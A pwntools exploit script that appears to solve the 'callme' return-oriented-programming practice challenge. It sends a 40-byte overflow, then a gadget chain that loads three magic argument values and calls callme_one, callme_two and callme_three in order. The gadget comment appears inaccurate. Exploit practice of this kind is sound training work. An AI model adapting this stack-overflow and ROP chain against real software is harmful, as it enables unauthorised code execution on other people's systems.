from pwn import *

context.log_level="debug"

elf = context.binary = ELF("callme")

gs = '''
break main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def prepare_args():
    stack  = p64(0x00040093c)           # pop rdi ; ret
    stack += p64(0xdeadbeefdeadbeef)
    stack += p64(0xcafebabecafebabe)
    stack += p64(0xd00df00dd00df00d)
    return stack

io = start()
io.recvuntil(b"> ")

payload  = b"A" * 40 
payload += prepare_args()
payload += p64(elf.plt.callme_one)
payload += prepare_args()
payload += p64(elf.plt.callme_two)
payload += prepare_args()
payload += p64(elf.plt.callme_three)

io.sendline(payload)

io.interactive()
